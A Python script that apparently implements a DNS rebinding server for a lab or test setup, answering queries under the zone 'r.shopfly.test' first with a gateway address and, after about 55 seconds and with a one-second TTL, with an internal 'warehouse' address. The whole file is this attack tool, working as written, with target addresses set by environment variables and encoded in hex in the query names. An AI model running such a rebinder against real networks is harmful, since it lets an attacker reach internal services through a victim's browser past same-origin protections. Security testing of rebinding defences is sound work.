#!/usr/bin/env python3
import ipaddress
import os
import socket
import struct
import time
from collections import OrderedDict

LISTEN = os.environ.get("LISTEN", "0.0.0.0")
PORT = int(os.environ.get("PORT", "53"))
ZONE = os.environ.get("REBIND_ZONE", "r.shopfly.test").rstrip(".").lower()
GATEWAY = ipaddress.ip_address(os.environ["GATEWAY_IP"])
WAREHOUSE = ipaddress.ip_address(os.environ["WAREHOUSE_IP"])
SWITCH_AFTER = float(os.environ.get("REBIND_AFTER_SECONDS", "55"))
RESET_AFTER = float(os.environ.get("REBIND_RESET_SECONDS", "180"))
MAX_ENTRIES = int(os.environ.get("REBIND_MAX_ENTRIES", "4096"))
first_seen = OrderedDict()


def decode_name(packet, offset=12):
    labels = []
    while True:
        length = packet[offset]
        offset += 1
        if length == 0:
            return ".".join(labels).lower(), offset
        if length & 0xC0:
            raise ValueError("compressed question names are unsupported")
        labels.append(packet[offset:offset + length].decode("ascii"))
        offset += length


def parse_target(qname):
    suffix = "." + ZONE
    if not qname.endswith(suffix):
        return None
    labels = qname[:-len(suffix)].split(".")
    if len(labels) != 3 or not labels[0]:
        return None
    warehouse = ipaddress.ip_address(int(labels[1], 16))
    gateway = ipaddress.ip_address(int(labels[2], 16))
    if warehouse != WAREHOUSE or gateway != GATEWAY:
        return None
    return gateway, warehouse


def answer(packet):
    qname, question_end = decode_name(packet)
    if question_end + 4 > len(packet):
        raise ValueError("truncated question")
    qtype, qclass = struct.unpack("!HH", packet[question_end:question_end + 4])
    question = packet[12:question_end + 4]
    flags = 0x8400
    target = parse_target(qname)
    if qclass != 1 or target is None:
        return packet[:2] + struct.pack("!HHHHH", flags | 3, 1, 0, 0, 0) + question
    if qtype != 1:
        return packet[:2] + struct.pack("!HHHHH", flags, 1, 0, 0, 0) + question

    now = time.monotonic()
    seen = first_seen.get(qname)
    if seen is None or now - seen >= RESET_AFTER:
        seen = now
        first_seen[qname] = seen
    first_seen.move_to_end(qname)
    while len(first_seen) > MAX_ENTRIES:
        first_seen.popitem(last=False)

    elapsed = now - seen
    ip = target[0] if elapsed < SWITCH_AFTER else target[1]
    resource = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 1, 4) + ip.packed
    phase = "gateway" if ip == target[0] else "warehouse"
    print(f"dns qname={qname} phase={phase} elapsed={elapsed:.3f}", flush=True)
    return packet[:2] + struct.pack("!HHHHH", flags, 1, 1, 0, 0) + question + resource


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN, PORT))
    print(f"rebinder listening on {LISTEN}:{PORT} for {ZONE}", flush=True)
    while True:
        packet, peer = sock.recvfrom(4096)
        try:
            sock.sendto(answer(packet), peer)
        except Exception as exc:
            print(f"dns parse error peer={peer[0]} error={type(exc).__name__}", flush=True)


if __name__ == "__main__":
    main()

